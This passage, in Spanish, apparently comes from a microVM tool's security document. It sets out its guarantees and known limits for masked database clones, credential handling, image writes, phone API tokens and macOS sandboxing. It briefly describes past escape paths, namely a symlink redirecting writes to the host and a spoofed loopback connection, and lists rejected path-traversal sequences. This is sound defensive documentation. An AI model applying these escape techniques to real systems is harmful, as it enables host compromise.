conexión (grafos guardados antes de la validación); en macOS, además, en el broker y en
`kling-vz` al recibir las aristas. Encontrado por el e2e real.

### 16. `kling db clone`: datos de producción, enmascarados antes de salir de la microVM

`kling db clone <url> -mask REGLAS` (ver [docs/db.md](docs/db.md#copia-de-producción-enmascarada-clone))
hace un golden de una base de producción. Es lo más delicado de `kling db`: un
enmascarado mal hecho filtra datos. Qué garantiza:

- **La contraseña de producción no entra en ninguna microVM ni en argv.** Se lee de
  `PGPASSWORD` o de stdin (una URL con contraseña se rechaza), va al proxy de
  credenciales de Postgres de la máquina de construcción por el cuerpo de una petición
  al daemon (§7) y el invitado solo recibe un marcador. Hacia el servidor, TLS
  verify-full por defecto; sin TLS (`sslmode=disable`), solo SCRAM-SHA-256.
- **Solo lectura.** Antes de volcar se comprueba el rol por el proxy: un superusuario se
  rechaza siempre y un rol que puede escribir en alguna tabla, salvo `-allow-writer`.
  `pg_dump` además lee en una transacción `READ ONLY`.
- **Lo sin enmascarar no toca el disco del host.** `pg_dump` corre dentro de la máquina
  de construcción y se restaura por una tubería en un Postgres cuyo directorio de datos
  es un tmpfs del invitado (sin swap en el invitado: si la hay, se niega). El overlay de
  esa máquina (un fichero del host) no recibe datos, y la máquina tiene `-on-ttl remove`:
  si `kling-db` muere, se borra al vencer en vez de congelarse (congelar guardaría su RAM
  en disco).
- **Enmascarado todo o nada.** Una transacción con los disparadores apagados
  (`session_replication_role = replica`: un disparador de auditoría no copia valores
  viejos a otra tabla), un `UPDATE` por tabla y una comprobación, fila a fila, de que
  ninguna columna enmascarada conserva un valor viejo. Cualquier fallo deshace la
  transacción, destruye la máquina y no deja golden.
- **Hash con sal secreta por construcción** (256 bits de `crypto/rand`, solo en el SQL
  del enmascarado, por stdin; nunca en disco, en el golden ni en el informe): el mismo
  valor da el mismo resultado dentro de una construcción (joins y claves foráneas
  siguen casando) y, sin la sal, no se puede comprobar un valor adivinado (un correo
  conocido) contra su enmascarado. Entre construcciones cambia.
- **El golden no es la máquina de construcción.** Un `UPDATE` deja las versiones viejas
  de las filas en las páginas y en el WAL; por eso se vuelca el cluster YA enmascarado y
  el golden se construye con `db-golden.sh` en una máquina nueva con `egress none`, sin
  credencial ni ruta a producción. El golden no contiene ni una página ni un byte de RAM
  que haya visto un dato sin enmascarar.
- **Bloqueo por defecto.** Una columna sospechosa por su nombre (datos personales en
  inglés, español, portugués y francés, y credenciales: `password_hash`, `api_key`,
  `access_token`, `client_secret`, `totp_seed`, `salt`…) o por su tipo (`jsonb`,
  `hstore`, `tsvector`, geométricos, arrays de texto, direcciones de red) sin regla
  para la construcción; una regla que no casa con ninguna columna, también (una errata
  no deja una columna sin tratar en silencio).
- **Errores e informe sin valores.** Los psql del volcado, del catálogo y del
  enmascarado corren con `VERBOSITY=sqlstate` (el código, no el mensaje que citaría el
  valor que falló), del `pg_dump` solo se enseñan sus líneas `pg_dump:` y el informe no
  tiene un solo campo en el que quepa un valor: nombres, tipos de regla y recuentos.

Qué **no** garantiza:

- **La detección es heurística.** Por nombre y tipo, no por contenido: un correo dentro
  de una columna de texto con un nombre neutro (`summary`) pasa si nadie pone regla
  (`-strict` obliga a decidir sobre toda columna de texto, JSON o array). Un `tsvector`
  mantenido por disparador no se regenera al enmascarar su fuente (los disparadores
  van apagados): necesita su propia regla, y el clon la exige. `keep` y `-allow-unmasked` son
  decisiones de quien construye, y el informe las deja escritas.
- **Enmascarar no es anonimizar.** Los tipos con hash conservan la igualdad (quién
  comparte correo con quién), las columnas sin regla (fechas, importes, ciudades) siguen
  ahí y, cruzadas, pueden reidentificar a alguien. El golden se trata como datos
  internos, no como públicos.
- **El volcado enmascarado pasa por el disco del host** (0600, en un directorio 0700,
  borrado al terminar) mientras `db-golden.sh` lo carga: lo mismo que acaba en el golden.
- **La RAM del invitado es memoria del host.** El tmpfs vive en la memoria del proceso
  del VMM; con swap en el host, el sistema operativo podría llevarla a disco. Un host
  para esto: sin swap o con swap cifrada.
- **El rol es el límite en producción.** La comprobación de solo lectura mira privilegios
  de tabla y `rolsuper`; no ve funciones `SECURITY DEFINER` ni otros caminos de
  escritura. Dale un rol que de verdad solo lea.
- El tramo entre el invitado y el proxy va en claro dentro de la máquina (como en §7), y
  el del proxy al servidor, en claro si se eligió `sslmode=disable`.

**`kling db slice`** (una tabla, sus filas relacionadas y el resto del esquema vacío; ver
[docs/db.md](docs/db.md#una-tabla-de-producción-slice-y-observación)) es `clone` con otro
relleno y hereda todo lo anterior: misma máquina, misma credencial en el proxy, misma
comprobación del rol, mismo enmascarado (con las mismas reglas, también para las tablas
vacías) y mismo golden en una máquina nueva. Lo propio:

- **Solo lectura en producción**: `pg_dump --schema-only`, una consulta del catálogo y
  una sola sesión en `REPEATABLE READ READ ONLY` con `\copy (SELECT ...) TO PROGRAM`.
  Las consultas las arma `kling-db` con nombres citados por el propio catálogo
  (`quote_ident`); un nombre con caracteres de control, barras invertidas o comillas
  (simples o dobles, que irían dentro del metacomando `\copy`) cerca de la
  tabla detiene la construcción, y `-table` solo admite `[esquema.]nombre` sin comillas.
- **Lo sin enmascarar sigue sin tocar un fichero**: cada `\copy` va por una tubería a un
  psql del Postgres del tmpfs (`COPY FROM` con `session_replication_role = replica`, sin
  disparadores ni comprobaciones de claves foráneas al cargar). En el tmpfs solo se
  escriben los cargadores, que llevan nombres, no datos.
- **Claves foráneas**: las que lo cargado no cumple quedan `NOT VALID` (o fuera, en una
  particionada) y el informe lo dice; no se inventan ni se borran filas.

**`kling db observe`** activa en una copia `log_min_duration_statement = 0` para la base de
la aplicación. Consecuencia: **el log de Postgres de la copia pasa a llevar SQL**, con sus
literales (lo que `kling db audit` daba por hecho que no pasaba; audit sigue leyendo solo
los mensajes de conexión). Para acotarlo: sin los parámetros enlazados
(`log_parameter_max_length = 0`), sin las sesiones del superusuario (así la rotación de
la clave no llega al log), solo en la copia (el golden no cambia) y el informe normaliza
las sentencias sin imprimir un literal. Úsalo en copias de goldens enmascarados y
apágalo (`-off`) al terminar; un fork o un snapshot de una copia observada hereda los
ajustes.

### 17. `kling db` con MySQL/MariaDB: la clave de cada copia no entra en el invitado

Las copias de una plantilla MariaDB (`scripts/db-golden-mysql.sh`, ver
[docs/mysql.md](docs/mysql.md)) siguen la regla de las de Postgres: la clave de cada
copia se genera en el host y vive solo ahí (`copies/<id>/password`, 0600), y al invitado
va **su hash** de `mysql_native_password` por stdin, al cliente de root por el socket
local (root solo entra por `unix_socket`, desde el propio invitado). En la misma sesión
se comprueba que `mysql.user` guarda ese hash; si no, la copia se destruye. La clave de
la plantilla tampoco entra: su hash se calcula en el host (`openssl` o `python3`; sin
ellos el script se niega) y no hay camino en claro.

Qué implica el hash elegido: `mysql_native_password` es SHA-1 doble y sin sal. Quien lea
el hash de una copia (su disco, su RAM o su snapshot son del host) puede atacarlo por
diccionario, y con él y un intercambio observado podría entrar sin la clave; con una
clave de 192 bits aleatorios el diccionario no sirve, y el disco de la copia ya lleva
los datos, que valen más que la clave. `caching_sha2_password` (con sal y 5000 rondas)
queda pendiente hasta poder validarlo contra un servidor real.

La plantilla: sin cuentas anónimas, sin `root` ni `mysql` fuera de `localhost`, sin base
`test`, `local-infile = 0`, `secure-file-priv` en un directorio vacío, sin log general
(ni SQL ni datos en disco) y `server_audit` solo con `CONNECT` (`FORCE_PLUS_PERMANENT`).
Las migraciones corren como root: lo que creen con `DEFINER` corre como root, y
`kling db doctor` lo avisa (`MY020`).

### 18. `kling db class`, `report` y `branch`: lo que queda en el host

- **`class`** no imprime ninguna clave: por copia, dirección, usuario y base. Las DSN con
  clave solo salen con `-passwords FICHERO`, a un fichero **0600** escrito aparte y
  renombrado (un enlace en esa ruta se sustituye, no se sigue); `-passwords -` se
  rechaza. `ls`, `reset` y `rm` solo tocan copias con `kling.db.class=<prefijo>` **y** el
  `-owner` pedido, y un nombre ajeno a la clase no se crea encima ni se borra.
- **`report`** guarda la definición en `reports/<nombre>.json` (0600, directorio 0700,
  leída como una contraseña: normal, del usuario, sin permisos para otros) y **ninguna
  clave**: la de la API sale del entorno de quien ejecuta (cron o systemd: un
  `EnvironmentFile` 0600, nunca la línea del crontab). La definición es el consentimiento
  de `ask -yes`: al cargarla se repiten todas las comprobaciones de `ask`, y
  `-send-data` (filas al proveedor) queda escrito y a la vista en `report ls`. Cada
  ejecución usa una copia nueva del golden que se borra con su clave pase lo que pase, y
  el resultado (datos de la base) va a stdout o a un fichero 0600. La SQL la genera el
  modelo en cada ejecución: la encierran las mismas capas que en `ask` (sqlguard, rol de
  solo lectura, transacción READ ONLY, plazo y LIMIT).
- **`branch`** serializa por repositorio con `flock` sobre `locks/branch-<repo>.lock`
  (0600, abierto con `O_NOFOLLOW` y comprobado de este usuario): dos checkouts a la vez
  no crean dos copias de una rama. El cerrojo es de este host; dos hosts contra el mismo
  daemon no se coordinan. El hook instalado con `-owner` y `-golden` lleva esos valores
  escritos (validados y entre comillas simples; no son secretos).

### 19. `kling db` con Redis y SQLite: la misma regla, o ninguna clave

Las copias Redis (`scripts/db-golden-redis.sh`, ver
[docs/db-engines.md](docs/db-engines.md)) siguen la regla de las de Postgres y MySQL: la
clave del usuario de la aplicación se genera en el host y vive solo ahí
(`copies/<id>/password`, 0600), y al invitado va **su SHA-256** (lo que guarda Redis,
`ACL SETUSER app resetpass #<hash>`) por stdin; en la misma llamada se comprueba con
`ACL GETUSER` que el usuario está activo con **exactamente** ese hash, y si no, la copia
se destruye. El usuario de la aplicación no tiene `@admin` (ni `CONFIG`, ni `ACL`, ni
`SHUTDOWN`, ni `MODULE`), y el servidor arranca sin `DEBUG` ni `MODULE`.

La administración (`default`) usa una clave que **nunca sale del invitado**: se genera
dentro, vive en `/etc/kling-db/redis-admin` (0600, root) y cada copia la estrena al
prepararse, de modo que dos copias del mismo dorado no comparten ninguna clave. Sí viaja
por la red del invitado como cualquier `AUTH`: quien fuera root en la copia la lee, pero
root en la copia ya es dueño de sus datos (la frontera es la microVM, como en Postgres).
SHA-256 sin sal es débil ante un diccionario; con 192 bits aleatorios no hay diccionario
que valga.

Las copias SQLite **no tienen clave**: no hay servidor ni red. Se entra con `kling exec` o
`kling shell`, que el daemon reserva a quien puede operar la máquina; el fichero es 0600
de root dentro. `connect -dsn` y `rotate` se rechazan.

Ni Redis ni SQLite tienen proxy de credenciales: `attach` se rechaza. MongoDB se deja
fuera porque su `createUser`/`updateUser` exige la clave en claro dentro del servidor.

### 20. Escribir dentro de una imagen no sale de ella

Una imagen no es de fiar: la trae quien la construye o la copia (`kling image copy`), y
sus enlaces simbólicos son suyos. `kling image put` (`PUT /images/{name}/files`) y el
recambio del puente escriben dentro como root, así que:

- **Linux** (la imagen montada por loop): la ruta nunca se pasa entera al kernel, que
  resolvería un enlace absoluto de la imagen contra la raíz del host. Se resuelve a mano
  componente a componente con `openat(O_NOFOLLOW)` relativo al directorio anterior; un
  enlace de un directorio intermedio se lee y se sigue dentro de la imagen (un destino
  absoluto desde su raíz, `..` acotado a ella, 40 saltos como mucho), y lo que se crea,
  se lee o se renombra va relativo al descriptor del directorio final (`mkdirat`,
  `openat`, `renameat`). Cambiar un componente por un enlace entre medias hace fallar
  la escritura, no la desvía. El último componente no se sigue: si es un enlace, se
  reemplaza el enlace. Antes de esto, con `usr/local -> /tmp/x` en la imagen, poner
  `/usr/local/bin/f` escribía `/tmp/x/bin/f` en el host (reproducido en el lab con el
  binario anterior; `internal/machine/put_seguro_linux.go`).
- **macOS**: `debugfs -w` sin montar, que no ve el sistema de ficheros del host; los
  enlaces se siguen igual, dentro de la imagen (`put_debugfs.go`).
- **`from_host`** se abre por `os.Root` sobre `/usr/local/lib/kindling`: un enlace de ese
  directorio no lleva a un fichero cualquiera del host.

### 21. La API del teléfono (8091) exige un token, también desde el daemon

`kling-phoned` (el agente de los teléfonos Android, `prototypes/android/phoned`) sirve
en el 8091 del invitado una API que controla el teléfono: tocar, escribir, instalar un
APK (ejecutar código en él). Quien llega a ese puerto: el proxy del daemon (`POST
/machines/{ref}/guest`), el reenvío de `127.0.0.1` del Mac, cualquier proceso del
anfitrión Linux y un nodo de grafo con una arista `link` al 8091. Los dos primeros y el
último marcan desde el anfitrión por el mismo camino, así que **el invitado no puede
saber quién le habla por el origen**. Por eso (#110):

- **Todo salvo `GET /v1/health` exige `Authorization: Bearer <token>`**, también por el
  proxy del daemon. El invitado solo guarda el sha256 de cada token, con un ámbito
  (`read`: pantalla y árbol; `control`: todo), en la RAM de la VM (`/run`, 0600);
  compara todos en tiempo constante, y un fichero ilegible cuenta como vacío.
- **Sin tokens, cerrado.** Un dorado no tiene ninguno (`kling phone golden build` usa
  uno de un solo uso y lo revoca antes de guardar, y lo comprueba), ni un clon hasta que
  su gancho de identidad los recibe por MMDS. Un nodo de grafo hecho del dorado no se
  controla por ninguna arista hasta `kling phone adopt`.
- **El token no pasa por MMDS**: el documento de identidad lleva su sha256. El token de
  control lo genera `kling phone` y lo guarda en el store del daemon (`/store/phone/<id>`),
  que solo se lee con acceso al socket: pedir el token al proxy no añade una confianza
  nueva, y un `curl` al socket sin él solo ve `/v1/health`. Con política de autorización
  (`docs/authz.md`) `/store` es de admin y un inquilino guarda sus tokens en un fichero
  0600 suyo.
- **Dar el control a otro nodo es darle el token** (`kling phone token <tel>`, o
  `-read` para uno que solo ve): una arista sigue siendo una autorización de red (§15) y
  el token la de la API. `-rotate` invalida todos los anteriores sin rehacer la
  identidad.
- `kling phone view` (el muro) y `kling phone mcp` (el servidor MCP) escuchan en
  loopback, contestan solo a un `Host` de loopback (rebinding de DNS) y exigen algo que
  un formulario de otra web no puede mandar sin preflight (`X-Kling-Wall: 1` en los POST
  del muro; `Content-Type: application/json` y una ruta secreta al azar en el MCP).
  Tienen el token de cada teléfono: quien llega a ellos controla los teléfonos.

Lo que no cubre: el token viaja en claro por el tramo anfitrión → invitado, como todo lo
del proxy y de las aristas (§15); y la API no tiene shell (cada ruta valida sus
argumentos), así que un token de control da el teléfono, no root en la VM.

### 22. macOS: `kling-vz` es lo que el invitado tiene delante

En el Mac no hay netns, iptables ni resolver en el host: la pila TCP/IP (gVisor), el DNS
y MMDS de cada invitado corren dentro de su `kling-vz`, que es un proceso del usuario.
Un fallo explotable ahí es código del invitado corriendo como el usuario, así que lo que
ese proceso puede tocar y cuánto puede gastar son barreras en sí mismas.

- **El perfil de sandbox aísla a una máquina de las demás** (`vz/cmd/kling-vz/kling-vz.sb`,
  `vz/internal/custodio`). Hasta ahora dejaba a `kling-vz` leer toda la raíz, incluido
  `secrets/snapshot.key` (la clave HMAC y la maestra de la que HKDF deriva la de cada
  `credentials.enc`), escribir en `snapshots/` y `volumes/` enteros y conectar a
  `localhost:*` aunque la máquina no tuviera red: un fallo en la pila de red, el DNS o
  MMDS daba las credenciales de todas las máquinas, reescribir el `mem.file` de
  cualquier dorado (que no lleva hash: es la memoria de cada instancia futura) y
  conectar al agente (exec) de las demás por sus reenvíos. Ahora:
  - **Ficheros**: su directorio y los ficheros exactos de su VM, que se conocen al
    confinarse (justo antes de crear o restaurar, con los discos ya reapuntados): el
    kernel, los discos de solo lectura y el estado que restaura, para leer; su overlay y
    sus volúmenes, para leer y escribir. Nunca `secrets/`, nunca escribir en
    `snapshots/` (dos reglas al final del perfil, por si el daemon le pasara ahí un
    disco). `kling-vz` no necesita ninguna clave de disco: las credenciales le llegan ya
    en claro por su API.
  - **Dorados**: `kling commit` pide el volcado en `snapshots/<nombre>/`, un nombre que
    no se sabe al confinarse. `kling-vz` lo vuelca en su directorio y un proceso
    **custodio** (el mismo binario, lanzado antes de encerrarse, confinado en su propio
    perfil: leer el directorio de la máquina, escribir bajo `snapshots/`, sin red) lo
    clona (`clonefile`) a su sitio. El custodio no se fía de `kling-vz`: solo escribe
    `snap.file` o `mem.file`, en un directorio que ya existe justo debajo de
    `snapshots/` (lo crea el daemon) y que no tiene `meta.json`, sin seguir enlaces y
    sin pisar un fichero que exista. Un dorado terminado no se puede tocar; lo peor que
    hace un `kling-vz` tomado es adelantarse al commit en curso de otra máquina, que
    falla en vez de quedar corrupto. Al clonar, lo que se escriba después en el origen
    no llega al dorado.
  - **Red**: escucha solo en `127.0.0.1:29000-29999` (sus reenvíos); sale al exterior
    solo con egress distinto de none; al loopback del Mac (que para el sandbox incluye
    `0.0.0.0`) solo en allowlist (el `-upstream 127.0.0.1:5432` de una credencial), y
    nunca al rango de los reenvíos.
  - Probado con `sandbox-exec` y el perfil real (`vz/scripts/sandbox-perfil.sh`): con el
    perfil anterior, 15 de 23 comprobaciones abrían lo que no debían (leer
    `snapshot.key`, otras máquinas y dorados ajenos; escribir dorados y volúmenes ajenos;
    conectar a un reenvío ajeno en los tres modos, también por `0.0.0.0`); con el nuevo,
    ninguna. Y de extremo a extremo en un M4 (macOS 26.5): exec, volumen, freeze/thaw,
    commit a un dorado, arrancar otra máquina de él, egress none/internet/allowlist.
  - Lo que queda: su propio directorio es suyo (el daemon lee de ahí el volcado de una
    congelación y el registro de auditoría), y con egress internet o allowlist sale a
    lo que la red del Mac alcance, filtrado por la política en el propio proceso.
- **Los reenvíos de `127.0.0.1` solo aceptan al mismo usuario, por dirección y puerto**
  (`vz/internal/peercred`). macOS no da las credenciales del otro extremo de un socket
  TCP, así que `kling-vz` busca entre los procesos de su usuario el socket que es el otro
  extremo. Hasta ahora comparaba solo los puertos, y en un Mac multiusuario otro usuario
  podía hacer `bind(IP-LAN:X)` + `connect(127.0.0.1:P)` con el puerto `X` de una
  conexión abierta del daemon: el reenvío la aceptaba y le daba el agente del invitado
  (exec). Ahora el socket tiene que ser IPv4 y casar en las dos direcciones además de en
  los dos puertos.
- **Lo que el invitado abre contra `kling-vz` está acotado, también en egress none**
  (`vz/internal/vnet`, `vz/internal/egress/dns.go`). Cada flujo UDP y cada conexión TCP al
  53 retienen goroutines hasta su plazo de inactividad, y no había tope: 3000 flujos al 53
  dejaban ~2800 goroutines vivas, y cada consulta abría su socket hacia el upstream. Ahora,
  por máquina: 64 flujos UDP al 53 y 64 conexiones TCP al 53 a la vez (por encima, el
  flujo se descarta y la conexión recibe un RST), 256 flujos UDP de salida, y hacia el
  upstream los mismos topes que el resolver de Linux: 32 consultas en vuelo y un cubo de
  200/s con ráfagas de 400 (por encima, SERVFAIL sin tocar la red), también para las
  búsquedas del proxy de credenciales. Una respuesta del upstream con otro id o con otra
  pregunta no se entrega ni siembra la allowlist (como `responseMatches` en Linux).
- **El DNS del invitado va a `1.1.1.1`, no al resolver del Mac** (`vz/internal/egress`).
  Se reenviaba al primer `nameserver` de `/etc/resolv.conf`, que en un Mac suele ser
  privado (el router, una VPN, el DNS de la empresa): con egress internet el invitado
  resolvía nombres de la intranet por split-horizon (`intranet.corp` → `10.x`) y podía
  reconocer la red interna aunque no pudiera conectar a ella. Ahora, como en Linux,
  el upstream es público y fijo. Consecuencia: en una red que bloquee `1.1.1.1:53`
  el invitado no resuelve (tampoco en Linux), y los nombres que solo existen en el DNS
  del Mac (VPN, `.local`) no los ve, que es justo lo que se quería.

### 23. Una plantilla compartida entrega lo que lleva a todos los inquilinos

Con política de autorización ([docs/authz.md](docs/authz.md)), `shared_templates` deja que
cualquier inquilino haga `run -from` (o `sandbox -from`) de un snapshot de admin. El
inquilino no puede cambiar ni borrar la plantilla, pero **cada instancia suya recibe todo
lo que la plantilla trae**, y compartirla es decidir dárselo a todos:

- **Sus credenciales.** Las de plantilla (`PUT /snapshots/{name}/credentials`,
  `secrets/credentials/<plantilla>.enc`) se entregan a cada máquina que nace de ella, la
  del inquilino incluida. La clave no entra en el invitado (§7), pero el inquilino puede
  **usarla**: cualquier petición suya a los dominios de la allowlist sale con ella, con los
  permisos que tenga en el servicio de fuera. Las que se aten a la plantilla después de
  compartirla valen igual para las instancias nuevas. El registro de auditoría del proxy
  dice qué máquina usó la credencial (y su `kling.owner`), no la impide.
- **Su memoria y su disco.** La plantilla es una foto del invitado: lo que el admin dejó
  en su RAM o en su overlay (un token en una variable de entorno, una caché, un fichero de
  configuración con una clave) lo lee el inquilino desde dentro de su instancia, con
  `exec` si la plantilla se hizo con `AllowExec` o desde el propio servicio si no.
- **Sus volúmenes.** Una plantilla de un admin que lleve volúmenes los reengancha en la
  instancia del inquilino (la única vía por la que un inquilino llega a un volumen).
- **Por nombre, no por contenido.** `shared_templates` lista nombres: si el admin borra
  `python` y hace otro snapshot sin dueño con ese nombre, el nuevo queda compartido sin
  tocar la política. (Uno con dueño no se comparte aunque esté en la lista.)

Por eso: comparta solo plantillas hechas para eso, sin credenciales ni secretos en la
memoria o el disco, o con credenciales de un servicio de fuera que den lo mismo a todos
los inquilinos (una cuenta de solo lectura, con su propia cuota, y `-allow-request` para
acotar las rutas). Lo que es de un inquilino va en una plantilla suya (sin compartir), o
en credenciales de máquina que se atan a cada instancia (`POST
/machines/{ref}/credentials`) después de crearla. Revise `kling template inspect
<plantilla>` (dominios con credencial, volúmenes, `allow_exec`) antes de añadirla a
`shared_templates`.

### 24. El constructor `oci` no corre como root

Importar una imagen de Docker baja de internet y parsea tars hostiles
(`internal/oci`, `internal/ext4`). Los demás constructores del daemon corren como root;
`oci` no lo necesita, así que en Linux corre con un usuario propio (`-build-as`,
`KLING_BUILD_AS`, por defecto `kindling-build`). Medido en el lab importando
`postgres:17-alpine`:

```
Uid:         996   996   996   996
Groups:      (ninguno)
CapEff:      0000000000000000
NoNewPrivs:  1
Max open files 4096 · Max data size 8 GiB · Max processes 512 · Max core file size 0
```

- **Otro usuario que el del VMM**, y el daemon rechaza que sean el mismo: el VMM no toca
  la caché de blobs ni los builds en curso, y el constructor no manda señales a los VMM
  ni escribe en los volúmenes.
- **Solo escribe lo suyo**: su directorio de trabajo (`build/` es de root 0711) y su
  caché, `cache/builder` (0700), aparte de la de los constructores que corren como root.
- **El daemon valida lo que deja**: la imagen sin seguir enlaces, regular, suya y con un
  enlace duro, y la mueve él a `images/`; `recipe.json` también sin seguir enlaces.
- **Entorno de lista blanca**: el del daemon no llega (puede llevar secretos).
- **De uno en uno, y barrido**: antes y después de cada construcción el daemon mata los
  procesos que queden con ese uid. Por eso tiene que ser un usuario de sistema dedicado
  (uid ≤ `SYS_UID_MAX`; uno de persona o `nobody` se rechaza), y las construcciones van
  en fila en todo el host (`/run/kindling-build-<uid>.lock`), no solo en un daemon.
- **Su caché no se cree**: como la puede escribir, lo cacheado se rehashea siempre
  antes de usarlo; un constructor comprometido no envenena los imports siguientes.

Sin ese usuario (o en macOS, o con el daemon sin root) corre como el daemon y se avisa
al arrancar. `debian` y `android` siguen como root. Detalle en
[docs/imagenes.md](docs/imagenes.md).

### 25. El entorno de `run -e` va por MMDS, y se congela con la máquina

`kling run -e` da el entorno a la máquina, no a la imagen: viaja en el cuerpo de la
petición, el daemon lo deja en MMDS antes de arrancar y lo borra en cuanto el agente
contesta, y solo guarda los nombres (`env_keys`); no va a argv, `state.json`, logs ni
`inspect`. Pero vive en la RAM del invitado (el entorno del servicio), así que `freeze`
(también el de `on_ttl`), `fork` y `save` lo escriben en el `mem.file` (0600 del
daemon), y las copias de una plantilla lo heredan. Es distinto de los secretos de
sesión (`kling machine secret`), que marcan la máquina (`has_secrets`) y no dejan
congelarla: el entorno es configuración. Un secreto que no deba tocar nunca el disco
va por `machine secret` o por el proxy de credenciales. Una imagen cuyo agente no sabe
leer el entorno hace fallar la máquina en vez de arrancar su servicio sin él.

### 26. `kling upgrade` no instala nada sin verificar, y deja volver

`kling upgrade` baja la release solo por https (también las redirecciones), con
tamaño acotado, y no acepta un binario que no esté en el `SHA256SUMS` de esa misma
release o cuyo hash no coincida; con `-from-dir`, si hay un `SHA256SUMS` al lado,
lo mismo. Todo se verifica y el binario nuevo se ejecuta en seco (`upgrade -schemas`,
contra ningún daemon) **antes** de parar nada. Se cambia por `rename` desde un
temporal del mismo directorio, nunca escribiendo encima, y lo de antes queda en
`<raíz>/upgrade/backups` (0700 del daemon) para la vuelta atrás. Lo que bajó un
usuario no lo ejecuta root: en Linux corre entero como root (`sudo`), y lo que
toca de los usuarios (sus extensiones) se lo deja a `kling upgrade -cli`. No pasa
nada por argv que no sea público (etiqueta, rutas, la unidad), y del entorno del
daemon solo lee `KLING_LIB_DIR`. `SHA256SUMS` sigue sin firmar (ver abajo).

## Lo que NO está resuelto

Se enumera a propósito, porque una lista de garantías sin sus límites es propaganda:

- **Jailer con salida explícita.** Desde este cambio es obligatorio por defecto en Linux
  (ver 11): arrancar sin él exige `KLING_JAILER=0` a propósito, y eso deja un aviso en el
  log. Quien lo pone y no lo lee sigue corriendo el VMM con el sistema de ficheros del
  host y los permisos de su usuario.
- **Cuota de disco por overlay, no por host.** Cada overlay es disperso y de tamaño
  lógico fijo al nacer: 512 MiB por defecto, de 64 MiB a 256 GiB con `run -disk`
  (`KLING_MAX_DISK_MIB` baja el máximo). La admisión por disco (ver 12) rechaza una
  máquina cuyo `-disk` no quepa en el disco libre y crear máquinas nuevas con el disco
  casi lleno, pero no reserva: las que ya corren pueden seguir llenando los suyos hasta
  su tamaño, y entre todas pasar de lo libre.
- **El cifrado en reposo es cosa del disco, no de kindling.** `kling info` dice si
  `$KLING_ROOT` está sobre dm-crypt; si no, quien tenga el disco tiene la memoria de las
  microVMs. Receta en `docs/cifrado.md`.
- **Sin política de autorización, el daemon confía en quien alcanza su socket.** Es el
  modo por defecto (sin `/etc/kling/authz.json`), y `kling doctor` lo avisa: si entras,
  puedes con todo. Con política ([docs/authz.md](docs/authz.md)) quien no tiene regla no
  puede nada y un inquilino solo lo suyo, pero es un MVP: los nombres de máquinas,
  snapshots y grafos son globales (un `409` dice que un nombre ajeno existe, no de quién
  es), las cuotas por inquilino son opcionales y miden lo declarado (máquinas, memoria
  y tamaño lógico de los discos escribibles; no lo escrito, ni snapshots, ni CPU), los
  inquilinos no usan volúmenes ni carpetas del host, y la política se lee al arrancar. Dos inquilinos siguen
  compartiendo host y kernel: lo que separa sus microVMs es lo de las barreras de arriba.
- **El proxy al invitado no filtra la ruta.** Solo llega a los puertos permitidos (ver
  10), pero dentro de ellos a cualquier ruta. No es una escalada: sin política quien
  llega al socket ya manda, y con ella un inquilino solo alcanza sus propias máquinas.
- **Una credencial se puede usar, aunque no leer.** El proxy impide que el invitado lea
  la clave o la saque a otro dominio, no que la use contra el suyo: es un oráculo de
  ella. Lo acota la clave misma (restringida, de solo lectura, con límites de gasto en
  el proveedor). `-allow-request` acota el oráculo a unas rutas, pero no mira la query
  ni el cuerpo. Una ruta cruda ambigua (`;`, `\`, `%2F`, `%5C`, `%2E`, `//`, `.`/`..` sin
  decodificar) se rechaza en vez de normalizarse (ver 4), así que ya no depende de
  adivinar cómo la lee el proveedor; lo que queda sin cubrir es una ambigüedad que no
  esté en esa lista —una convención propia de un framework concreto, por ejemplo—, y ahí
  sigue valiendo usar patrones exactos mejor que `/**`. La redacción del eco es defensa
  en profundidad y cubre las transformaciones habituales, no todas las imaginables. Esto
  vale igual en macOS: `PUT /kling/credentials` lleva `allow` y `kling-vz` aplica las
  mismas reglas antes de reenviar.
- **MySQL: sin prueba del servidor y sin cancelación.** Con `-upstream-tls disable` el
  servidor no prueba que conoce la clave (MySQL no tiene nada como la firma de SCRAM),
  `KILL QUERY` con el id del saludo no cancela nada, la base de la credencial no es una
  frontera (`USE otra`) y `caching_sha2_password` sin TLS solo funciona con la caché del
  servidor ya caliente. `kling db attach`, `role`, `rehearse`, `snapshot`/`undo`,
  `tenant-check`, `ask`, `clone` y `doctor -url` no existen para MySQL todavía, y las
  plantillas de MySQL 8 de Oracle no se han probado (Alpine solo empaqueta MariaDB).
- **Redis y SQLite en `kling db`: lo básico.** Solo `up`, `fork`, `connect`, `reset`,
  `rm`, `doctor` (y `rotate` en Redis); lo demás se rechaza. Sin proxy de credenciales
  (Redis en otra microVM no se comparte), sin `audit` y sin `doctor -url`. Los scripts de
  plantilla no se han ejecutado todavía contra un Redis ni un SQLite reales en el lab.
- **Postgres: `-database` es obligatoria.** Sin base fijada el rol entraría en cualquiera
  con `CONNECT`, así que hace falta `-database` o `-any-database` expreso (el CLI avisa).
  Los almacenes anteriores, sin base, se leen como `-any-database`: lo que permitían.
- **Postgres: el rol es el límite, no el proxy.** El proxy no mira el SQL: no hay lista
  de sentencias permitidas y el invitado hace todo lo que el rol puede. Lo que acota el
  daño es el rol mismo (solo lectura, `GRANT` a lo justo, sin `CREATEROLE`, un
  `CONNECTION LIMIT`). Si el rol puede, el invitado también puede `ALTER ROLE ... PASSWORD`
  y cambiar la contraseña: no la leería (la nueva es suya), pero la clave del proxy
  dejaría de valer. El tramo del invitado va sin TLS dentro de la máquina (ver 7); un
  cliente con `sslmode=require` o `verify-full`, o con `channel_binding=require`, no
  conecta: tiene que usar `disable` o `prefer`. Un servidor con IP privada (una base de
  datos en la LAN o en la VPC) no es alcanzable por el proxy salvo que el operador lo
  fije con `-upstream`; el proxy no descubre ni sigue destinos privados por su cuenta.
  Con `-upstream-tls disable`, lo que pasa tras la autenticación viaja en claro entre el
  proxy y el servidor.
- **`kling db clone` enmascara lo que las reglas y la detección ven.** Datos personales
  dentro de texto libre o de JSON sin regla, o combinaciones de columnas no sensibles
  que reidentifican, pasan al golden; el volcado enmascarado pasa por el disco del host
  mientras se carga, y la RAM de la máquina de construcción puede ir a la swap del host.
  Ver 16.
- **`kling db attach`: compartir una copia es compartir sus datos.** Todos los agentes
  con attach a la misma copia ven y, con el rol de la aplicación, escriben la misma base:
  una copia compartida no aísla a unos agentes de otros (para eso, una copia por agente,
  o un rol de solo lectura por agente con `-role`). Las consultas viajan en claro por el
  veth del host entre el proxy y la copia (la contraseña no: SCRAM). `kling db rotate`
  o `reset`/`undo` de la copia rompen los attach existentes (clave o id nuevos): hay que
